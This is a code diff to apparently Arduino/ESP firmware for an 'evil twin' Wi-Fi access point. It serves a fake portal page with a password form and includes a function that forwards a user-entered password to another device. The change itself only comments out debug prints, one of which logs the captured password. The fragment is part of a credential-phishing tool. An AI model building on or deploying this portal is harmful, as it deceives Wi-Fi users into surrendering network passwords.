@@ -30,7 +30,7 @@ String        evilAPName   = "";
 void handleIndex();
 
 String header(String t) {
-  Serial.print("\n HEADER INVOKED");
+  //Serial.print("\n HEADER INVOKED");
   String a = String(evilAPName);
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
@@ -53,12 +53,12 @@ String header(String t) {
 }
 
 String footer() {
-    Serial.print("\n FOOTER INVOKED");
+    //Serial.print("\n FOOTER INVOKED");
   return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
 
 String index() {
-  Serial.print("\n INDEX INVOKED");
+  //Serial.print("\n INDEX INVOKED");
   return header(TITLE)
        + "<div>" + BODY + "</ol></div><div>"
        + "<form action='/' method=post>"
@@ -74,10 +74,10 @@ int sentOverEspNow = 1;
 
 //pass password entered by the user to C5
 void sendPasswordToC5() {
-  Serial.print("\sendPasswordToC5 invoked, _tryPassword:");
-  Serial.println(_tryPassword);
-  Serial.print("\lastPasswordSentToC5:");
-  Serial.println(lastPasswordSentToC5);
+  // Serial.print("\sendPasswordToC5 invoked, _tryPassword:");
+  // Serial.println(_tryPassword);
+  // Serial.print("\lastPasswordSentToC5:");
+  // Serial.println(lastPasswordSentToC5);
   
 
   if ((_tryPassword.length() > 0) && 
